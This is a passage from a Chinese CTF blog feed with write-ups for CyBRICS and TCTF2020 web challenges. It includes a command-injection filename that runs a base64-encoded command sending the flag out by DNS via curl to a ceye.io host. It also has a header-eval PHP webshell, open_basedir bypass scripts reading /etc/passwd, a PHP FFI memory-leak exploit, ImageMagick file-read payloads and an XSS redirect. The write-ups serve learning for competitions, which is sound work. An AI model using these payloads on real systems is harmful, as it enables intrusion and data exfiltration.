class="literal">None</span> <span class="keyword">and</span> mime_type.EXTENSION == <span class="string">"png"</span>:</span><br><span class="line">            images.append(image)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"result.html"</span>, uid=uid, images=images)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/uploads/&lt;uid&gt;/&lt;image&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">image</span><span class="params">(uid, image)</span>:</span></span><br><span class="line">    logging.debug(request.headers)</span><br><span class="line">    dir = str(Path(app.config[<span class="string">'UPLOAD_FOLDER'</span>]) / uid)</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(dir, image)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(413)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_entity_too_large</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"File is too large"</span>, <span class="number">413</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'localhost'</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>代码中可以进行命令注入，我注释了，但是命令打过去没有得到结果。。。应该是题目服务器存在防火墙阻止了通过80端口向外进行资源请求，因此考虑利用DNSlog拿命令执行的结果，参考<a href="https://blog.csdn.net/qq_17204441/article/details/89063104">这里</a>。</p><p>如果想往DNS平台上打，就需要执行一些命令，但是字符进行了限制：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> bool(re.match(<span class="string">"^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$"</span>, file.filename)) <span class="keyword">or</span> <span class="string">".."</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">    logging.debug(<span class="string">f'Invalid symbols in filename: <span class="subst">&#123;file.content_type&#125;</span>'</span>)</span><br><span class="line">    flash(<span class="string">'Invalid filename'</span>, <span class="string">'danger'</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(request.url)</span><br></pre></td></tr></table></figure><p>会从文件名的头部开始到文件名结尾进行多次匹配，如果字符在<code>a-zA-Z0-9_-. &#39;&quot;=$()|</code>之中，则bool函数处理后是1，加上前面的<code>not</code>转为0，也就通过了检测，所以我们构造的文件名必须在上述字符的范围内。</p><h4 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h4><p>这里用了<a href="http://ceye.io/平台">http://ceye.io/平台</a></p><p>需要构造payload如下：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">flag=<span class="constructor">$(<span class="params">cat</span> <span class="params">main</span>.<span class="params">py</span>|<span class="params">grep</span> -<span class="params">wo</span> <span class="params">cybrics</span>&#123;.<span class="operator">*</span>|<span class="params">base64</span>|<span class="params">tr</span> -<span class="params">d</span> '=')</span>;curl $flag.o3svs0.ceye.io</span><br></pre></td></tr></table></figure><p>可以看到其中<code>{*</code>字符都不在白名单里，因此需要进行处理，base64是个不错的选择</p><p>base64结果：</p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">ZmxhZz<span class="number">0</span>kKG<span class="symbol">NhdCBtYWluLnB5</span>fGdyZXAgLXdvIG<span class="symbol">N5</span>Y<span class="symbol">nJpY3</span><span class="symbol">N7</span>Lip<span class="number">8</span>YmFzZTY<span class="number">0</span>fHRyIC<span class="number">1</span>kICc<span class="number">9</span>Jyk<span class="number">7</span>Y<span class="number">3</span>VybCAkZmxhZy<span class="number">5</span>v<span class="name">M3</span><span class="symbol">N2</span>czAuY<span class="number">2</span>V<span class="number">5</span>ZS<span class="number">5</span>pbw==</span><br></pre></td></tr></table></figure><p>包裹上命令：</p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">echo ZmxhZz<span class="number">0</span>kKG<span class="symbol">NhdCBtYWluLnB5</span>fGdyZXAgLXdvIG<span class="symbol">N5</span>Y<span class="symbol">nJpY3</span><span class="symbol">N7</span>Lip<span class="number">8</span>YmFzZTY<span class="number">0</span>fHRyIC<span class="number">1</span>kICc<span class="number">9</span>Jyk<span class="number">7</span>Y<span class="number">3</span>VybCAkZmxhZy<span class="number">5</span>v<span class="name">M3</span><span class="symbol">N2</span>czAuY<span class="number">2</span>V<span class="number">5</span>ZS<span class="number">5</span>pbw==|base<span class="number">64</span> -d | sh</span><br></pre></td></tr></table></figure><p>最终文件名：</p><figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">ggb0n'|<span class="type">|echo</span> ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy5vM3N2czAuY2V5ZS5pbw==|<span class="type">base64</span> -d | <span class="type">sh</span>|<span class="type">|'.gif</span></span><br></pre></td></tr></table></figure><p>然后上传、抓包、改文件名、改文件类型，在DNS平台获取结果：</p><p><img src="http://ggb0n.cool/images/cybrics07.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记得去年是放假回家的路上比赛开始的，回到家开始做，结果一道题也没出…&lt;/p&gt;
&lt;p&gt;今年还行，简单题能做做。
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="比赛划水" scheme="http://ggb0n.cool/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="流量分析" scheme="http://ggb0n.cool/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="RSA攻击" scheme="http://ggb0n.cool/tags/RSA%E6%94%BB%E5%87%BB/"/>
    
      <category term="低加密指数广播攻击" scheme="http://ggb0n.cool/tags/%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>TCTF2020部分题解</title>
    <link href="http://ggb0n.cool/2020/06/29/TCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <id>http://ggb0n.cool/2020/06/29/TCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</id>
    <published>2020-06-29T08:47:34.000Z</published>
    <updated>2020-07-26T04:53:10.935Z</updated>
    
    <content type="html"><![CDATA[<p>比赛的时候做题一头雾水，很多题一知半解，不能自己独立完成，赛后看飘零师傅的题解进一步学习。<a id="more"></a></p><h3 id="Cloud-Computing"><a href="#Cloud-Computing" class="headerlink" title="Cloud Computing"></a><strong>Cloud Computing</strong></h3><p>一道出在了 Misc 的题目，但是考的是 web 的 open_basedir bypass。</p><p>进入题目，给出源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">'sandbox/'</span> . sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) . <span class="string">'/'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">  mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">"action"</span>] ?? <span class="string">""</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'pwd'</span>:</span><br><span class="line">    <span class="keyword">echo</span> $dir;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'upload'</span>:</span><br><span class="line">    $data = $_GET[<span class="string">"data"</span>] ?? <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (waf($data)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'waf sucks...'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="string">"$dir"</span> . <span class="string">"index.php"</span>, $data);</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'shell'</span>:</span><br><span class="line">    initShellEnv($dir);</span><br><span class="line">    <span class="keyword">include</span> $dir . <span class="string">"index.php"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然需要在传参<code>upload</code>时写入小马 getshell，然后再传参<code>shell</code>来进行 RCE。</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>由于引号，下划线等字符等字符被ban掉了，因此考虑无参数RCE，利用<code>eval(end(getallheaders()))</code>的方式结合在请求头中添加要执行的code从而bypass waf。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">"&lt;?=eval(end(getallheaders()));?&gt;"</span></span><br><span class="line">code = <span class="string">r"var_dump('ggb0n');"</span></span><br><span class="line">headers = &#123;<span class="string">'a'</span>:code&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="http://ggb0n.cool/images/tctf04.png" alt=""></p><p>但是依旧无法使用 phpinfo 等函数，怀疑是被disable_function给禁了，这里开启报错查看原因：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">code = <span class="string">r"error_reporting(-1);phpinfo();"</span></span><br></pre></td></tr></table></figure><p><img src="http://ggb0n.cool/images/tctf05.png" alt=""></p><p>可以看到函数确实被禁了，同时借助 readfile 函数发现开启了 open basedir：</p><p><img src="http://ggb0n.cool/images/tctf06.png" alt=""></p><p>但是 sandbox 中可以任意创建文件和目录，因此可以结合 mkdir 和 chdir 进行 bypass，payload 如下：</p><figure class="highlight scilab"><table><tr><td class="code"><pre><span class="line">code = <span class="string">"error_reporting(E_ALL);chdir('</span>sandbox/<span class="number">52933</span>f6438c743819c0d2b1031d5547ab025d7d1/<span class="string">');mkdir('</span>x');<span class="built_in">chdir</span>(<span class="string">'x'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);print(base64_encode(file_get_contents(<span class="string">'/etc/passwd'</span>)));<span class="string">"</span></span><br></pre></td></tr></table></figure><p>回显如下：</p><p><img src="http://ggb0n.cool/images/tctf07.png" alt=""></p><p>可见成功 bypass，然后读取根目录下的 flag 文件即可，拿到一个 img 文件，其中隐藏了 flag 的图片。</p><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://pwnable.org:47780/?action=upload&amp;data=%s"</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">"&lt;?=eval(end(getallheaders()));?&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#code = r"var_dump('ggb0n');"</span></span><br><span class="line"><span class="comment">#code = r"error_reporting(-1);phpinfo();"</span></span><br><span class="line"><span class="comment">#code = r"error_reporting(-1);readfile('/etc/passwd');"</span></span><br><span class="line"><span class="comment">#code = "error_reporting(E_ALL));chdir('/var/www/html/sandbox/52933f6438c743819c0d2b1031d5547ab025d7d1/');mkdir('ggb0n');chdir('ggb0n');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');readfile('/etc/passwd');"</span></span><br><span class="line">code = <span class="string">"error_reporting(E_ALL);chdir('sandbox/52933f6438c743819c0d2b1031d5547ab025d7d1/');mkdir('x');chdir('x');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print(base64_encode(file_get_contents('/flag')));"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'a'</span>:code&#125;</span><br><span class="line"></span><br><span class="line">dir_url = <span class="string">"http://pwnable.org:47780/?action=pwd"</span></span><br><span class="line"></span><br><span class="line">first_url = url % data</span><br><span class="line">second_url = <span class="string">"http://pwnable.org:47780/?action=shell"</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url=dir_url)</span><br><span class="line">print(r.content)</span><br><span class="line">r = requests.get(url=first_url,headers=headers)</span><br><span class="line">print(r.content)</span><br><span class="line">r = requests.get(url=second_url,headers=headers)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure><h3 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a><strong>Wechat Generator</strong></h3><p>这题考察 ImageMagick 和 XSS</p><h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>拿到题目发现是一个生成聊天图片的页面，有 preview 和 share 两个按钮，前者用于生成，后者用于分享。</p><p><img src="http://ggb0n.cool/images/tctf08.png" alt=""></p><p>share 按钮可以获取到一个 url，即为生成图片的 url</p><p><img src="http://ggb0n.cool/images/tctf09.png" alt=""></p><p>访问该路径可以得到如下信息：</p><p><img src="http://ggb0n.cool/images/tctf12.png" alt=""></p><p>图中可以看到，我们会得到一个 png 的路径，浏览器去访问就可以得到生成的 png 图片，如果将 png 改为 txt 则会报错，但是改为 htm 却可以正常访问：</p><p><img src="http://ggb0n.cool/images/tctf13.png" alt=""></p><p>可以看到，回显中包含提交的信息字段内容，并且解析为 html 了，那么我们是否可以考虑引入标签进行闭合？</p><p>先看下 data 传参的内容：</p><p><img src="http://ggb0n.cool/images/tctf11.png" alt=""></p><p>我们构造 data 内容去读取flag试试，构造如下payload：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"type"</span>:<span class="number">0</span>,<span class="attr">"message"</span>:<span class="string">"[aaa\" /&gt;&lt;image width=\"512\" height=\"512\" href=\"text:/flag\"/&gt;]"</span>&#125;]</span><br></pre></td></tr></table></figure><p>提交之后点击 share 按钮访问，得到生成的图片，放大之后看到内容如下：</p><p><img src="http://ggb0n.cool/images/tctf16.png" alt=""></p><p>说明这个思路是对的，那尝试读取 web 文件路径，想要读取<code>/proc/self/</code>下的内容，但是<code>proc</code>被过滤，双写绕过即可：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"type"</span>:<span class="number">0</span>,<span class="attr">"message"</span>:<span class="string">"[aaa\" /&gt;&lt;image width=\"512\" height=\"512\" href=\"text:/prprococ/self\"/&gt;]"</span>&#125;]</span><br></pre></td></tr></table></figure><p>提交之后再次 share，得到图片信息如下：</p><p><img src="http://ggb0n.cool/images/tctf17.png" alt=""></p><p>说明这个方法是没问题的，通过寻找，可以发现<code>/app/app.py</code>存在，并且包含关键信息，如下payload读取：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"type"</span>:<span class="number">0</span>,<span class="attr">"message"</span>:<span class="string">"[aaa\" /&gt;&lt;image width=\"512\" height=\"512\" href=\"text:/app/app.py\"/&gt;]"</span>&#125;]</span><br></pre></td></tr></table></figure><p><img src="http://ggb0n.cool/images/tctf18.png" alt=""></p><p>可以看到，存在<code>/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws</code>路由，访问之后，页面跳转：</p><p><img src="http://ggb0n.cool/images/tctf19.png" alt=""></p><p>也就是要我们去构造 xss，使服务端触发 alert(1)</p><p>但是题目中存在CSP：</p><figure class="highlight csp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">img-src</span> * data:; <span class="keyword">default-src</span> <span class="string">'self'</span>; <span class="keyword">style-src</span> <span class="string">'self'</span> <span class="string">'unsafe-inline'</span>; <span class="keyword">connect-src</span> <span class="string">'self'</span>; <span class="keyword">object-src</span> <span class="string">'none'</span>; <span class="keyword">base-uri</span> <span class="string">'self'</span></span><br></pre></td></tr></table></figure><p>并且 src 被过滤，还是通过双写进行绕过，但是又找不到可控的 js 文件，于是考虑用<code>meta</code>标签进行跳转：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"type"</span>:<span class="number">0</span>,<span class="attr">"message"</span>:<span class="string">"[aaa\" /&gt;&lt;meMETAta content=\"0;url=http://ip/x.html\" http-equiv=\"refresh\"&gt;]"</span>&#125;]</span><br></pre></td></tr></table></figure><p>注意使用<code>htm</code>后缀。</p><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>考察 bypass open_basedir</p><h4 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h4><p>首先 phpinfo 看一下，发现 disable_functions、open_basedir：</p><p><img src="http://ggb0n.cool/images/tctf21.png" alt=""></p><p><img src="http://ggb0n.cool/images/tctf22.png" alt=""></p><p>目录不可写，用如下的代码传参过去读取目录：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span> ($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ggb0n.cool/images/tctf20.png" alt=""></p><p>发现了 flag.h 和 flag.o 的存在，蚁剑插件“脚本执行”执行如下代码读取 flag.h 内容：</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">mkdir</span>(<span class="string">'minx'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'minx'</span>);</span><br><span class="line"><span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line"><span class="selector-tag">echo</span> <span class="selector-tag">file_get_contents</span>(<span class="string">'/flag.h'</span>);</span><br></pre></td></tr></table></figure><p>得到 flag.h 的内容如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FFI_LIB <span class="meta-string">"/flag.so"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FFI_SCOPE <span class="meta-string">"flag"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">flag_fUn3t1on_fFi</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><blockquote><p> php 7.4可使用 FFI 调用 c 函数，于是查看phpinfo，开启了 FFI。</p></blockquote><p>再执行如下代码读取到 flag：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ffi = FFI::load(<span class="string">"/flag.h"</span>);</span><br><span class="line">$a = $ffi-&gt;flag_fUn3t1on_fFi();</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">30</span>; $i++) &#123; </span><br><span class="line"> print_r($a[$i]);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="noeasyphp"><a href="#noeasyphp" class="headerlink" title="noeasyphp"></a>noeasyphp</h3><p>继续考察 FFI，只不过php版本提高了，API也更改了。</p><h4 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h4><p>蚁剑脚本执行：</p><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="name">scandir</span>('glob<span class="symbol">:///*</span>'))</span><br></pre></td></tr></table></figure><p>发现仍然存在 flag.h 和 flag.o，想办法读取 flag.h，但是不像上一题，直接给出了读取 flag 的函数名，并且将 FFI:cdef 给禁用了，只好利用 FFI 中与内存相关的函数进行内存泄露，从而获取函数名。</p><p>飘零师傅的 exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://pwnable.org:19261"</span>params = &#123;<span class="string">"rh"</span>:<span class="string">'''</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    $ffi=FFI::load("/flag.h");</span></span><br><span class="line"><span class="string">    //get flag</span></span><br><span class="line"><span class="string">    //$a = $ffi-&gt;flag_wAt3_uP_apA3H1();</span></span><br><span class="line"><span class="string">    //for($i = 0; $i &lt; 128; $i++)&#123;</span></span><br><span class="line"><span class="string">        echo $a[$i];</span></span><br><span class="line"><span class="string">    //&#125;</span></span><br><span class="line"><span class="string">    $a = $ffi-&gt;new("char[8]", false);</span></span><br><span class="line"><span class="string">    $a[0] = 'f';</span></span><br><span class="line"><span class="string">    $a[1] = 'l';</span></span><br><span class="line"><span class="string">    $a[2] = 'a';</span></span><br><span class="line"><span class="string">    $a[3] = 'g';</span></span><br><span class="line"><span class="string">    $a[4] = 'f';</span></span><br><span class="line"><span class="string">    $a[5] = 'l';</span></span><br><span class="line"><span class="string">    $a[6] = 'a';</span></span><br><span class="line"><span class="string">    $a[7] = 'g';</span></span><br><span class="line"><span class="string">    $b = $ffi-&gt;new("char[8]", false);</span></span><br><span class="line"><span class="string">    $b[0] = 'f';</span></span><br><span class="line"><span class="string">    $b[1] = 'l';</span></span><br><span class="line"><span class="string">    $b[2] = 'a';</span></span><br><span class="line"><span class="string">    $b[3] = 'g';</span></span><br><span class="line"><span class="string">    $newa = $ffi-&gt;cast("void*", $a);</span></span><br><span class="line"><span class="string">    var_dump($newa);</span></span><br><span class="line"><span class="string">    $newb = $ffi-&gt;cast("void*", $b);</span></span><br><span class="line"><span class="string">    var_dump($newb);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    $addr_of_a = FFI::new("unsigned long long");</span></span><br><span class="line"><span class="string">    FFI::memcpy($addr_of_a, FFI::addr($newa), 8);</span></span><br><span class="line"><span class="string">    var_dump($addr_of_a);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    $leak = FFI::new(FFI::arrayType($ffi-&gt;type('char'), [102400]), false);</span></span><br><span class="line"><span class="string">    FFI::memcpy($leak, $newa-0x20000, 102400);</span></span><br><span class="line"><span class="string">    $tmp = FFI::string($leak,102400);</span></span><br><span class="line"><span class="string">    var_dump($tmp);</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">    //var_dump($leak);</span></span><br><span class="line"><span class="string">    //$leak[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="string">    //$leak[1] = 0x61616161;</span></span><br><span class="line"><span class="string">    //var_dump($a);</span></span><br><span class="line"><span class="string">    //FFI::memcpy($newa-0x8, $leak, 128*8);</span></span><br><span class="line"><span class="string">    //var_dump($a);</span></span><br><span class="line"><span class="string">    //var_dump(777);</span></span><br><span class="line"><span class="string">&#125; catch (FFI\Exception $ex) &#123;</span></span><br><span class="line"><span class="string">    echo $ex-&gt;getMessage(), PHP_EOL;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">var_dump(1);</span></span><br><span class="line"><span class="string">'''</span>&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url=url,params=params)</span><br><span class="line"></span><br><span class="line">print((res.text).encode(<span class="string">"utf-8"</span>))</span><br></pre></td></tr></table></figure><p>获取到函数名<code>$a = $ffi-&gt;flag_wAt3_uP_apA3H1();</code></p><p>再次执行如下代码即可获取 flag：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ffi = FFI::load(<span class="string">"/flag.h"</span>);</span><br><span class="line">$a = $ffi-&gt;flag_wAt3_uP_apA3H1();</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">30</span>; $i++) &#123; </span><br><span class="line"> print_r($a[$i]);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h3><p>一道 web + crypto 题目，考察分组密码的重放攻击，利用多个用户进行偷钱。</p><h4 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h4><p>题目共有五个接口：<code>register</code>、<code>login</code>、<code>buy</code>、<code>info</code>、<code>charge</code></p><p>注册并登录之后可以购买 lottery 或者购买 flag，但是 coin 明显不够，需要通过购买 lottery 来增加 coin，但是仅仅这样几乎不可能凑得狗钱去买 flag。</p><p>首先看一下 buy、info、charge三个路由的作用：</p><p>buy 可以购买 lottery，以此来增加 coin：</p><p><img src="http://ggb0n.cool/images/tctf01.png" alt=""></p><p>通过 bp 截包，可以发现点击 buy 之后，会跳转 info 路由，该路由是对上图中生成的 enc 进行解密，得到明文信息：</p><p><img src="http://ggb0n.cool/images/tctf02.png" alt=""></p><p>charge 路由是提交购买 lottery 的申请：</p><p><img src="http://ggb0n.cool/images/tctf03.png" alt=""></p><p>比赛的时候尝试直接改 coin 传参的值，结果行不通，由于不知道密文的生成方式，后面就是密码学师傅做出来的了。赛后看飘零师傅的题解才明白是分组密码的重放攻击。</p><h4 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h4><p>生成几组密文，结果发现每组密文的结尾是一样的，</p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="symbol">NFEbZFZjCg3</span>gtWhc<span class="number">8</span>Ys<span class="number">7</span>VqHQA<span class="number">95</span>DryQjHRh<span class="number">2</span>tLARA<span class="number">2</span>gqu<span class="number">5</span>s\/<span class="number">0</span>Tt<span class="number">0</span>wSubjK<span class="meta">o9</span>CR<span class="number">7</span>rF<span class="symbol">njfKMixVIRY5</span>dbMQ<span class="number">9</span>\/<span class="number">5</span>AYlLiR<span class="number">7</span>zBGZoi<span class="number">3</span>DhTX<span class="number">7</span>idZjl<span class="number">51</span>uaWb<span class="number">7</span>fyDebazEdvb<span class="number">6</span>joTDaZjFZc<span class="number">5</span>Bt<span class="number">0</span>z<span class="number">8</span>ZhT<span class="symbol">Nb0</span>fbSt<span class="number">9</span>reYD<span class="number">8</span>AcCI<span class="number">4</span>hIXsxZg=</span><br><span class="line"></span><br><span class="line">KS<span class="number">2</span>YKOxItMGdsfQsaKqRtwIqSIxFrGVl\/<span class="symbol">n0</span>QqIvlfMJDLDFMD<span class="name">G67</span>cwWd<span class="number">4</span>r\/fxwFdi<span class="number">5</span>OUGyUHac<span class="number">9</span>\/FSi<span class="number">9</span>\/T<span class="number">54</span>JBdL<span class="number">4</span>iacaoV<span class="number">3</span>cTJciBy<span class="number">8</span>zyODFKFwXCcaytygQ<span class="symbol">NtwfZdEK6</span>FWrCvVHCIYPIch<span class="number">4</span>ewOSPbSt<span class="number">9</span>reYD<span class="number">8</span>AcCI<span class="number">4</span>hIXsxZg=</span><br></pre></td></tr></table></figure><p>转为16进制发现最后的32位均为<code>f6d2b7dade603f007022388485ecc598</code>，应该是32位的padding，同时看到密文总长是256位。猜测位ECB分组模式的密码，普遍的攻击方式是重放攻击。</p><p>通过对两个不同用户的 enc 的 16 进制数据进行32、64、96、128位的替换，发现当替换128位时，将用户1的 lottery 完全替换为了用户2的 lottery，但是同时 user 的前两位也被替换了。</p><p>解题思路就是通过爆破注册多个可以使 user 的前两位一样的用户，爆破脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">register_url = <span class="string">'http://pwnable.org:2333/user/register'</span></span><br><span class="line">login_url = <span class="string">'http://pwnable.org:2333/user/login'</span></span><br><span class="line">lottery_url = <span class="string">'http://pwnable.org:2333/lottery/buy'</span></span><br><span class="line">info_url = <span class="string">'http://pwnable.org:2333/lottery/info'</span></span><br><span class="line"><span class="comment">#charge_url = http://pwnable.org:2333/lottery/charge</span></span><br><span class="line"></span><br><span class="line">usnamelist = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(usname,passwd,url)</span>:</span></span><br><span class="line">usname = usname</span><br><span class="line">passwd = passwd</span><br><span class="line">url = url</span><br><span class="line">data = &#123;<span class="string">'username'</span>:usname,<span class="string">'password'</span>:passwd&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span 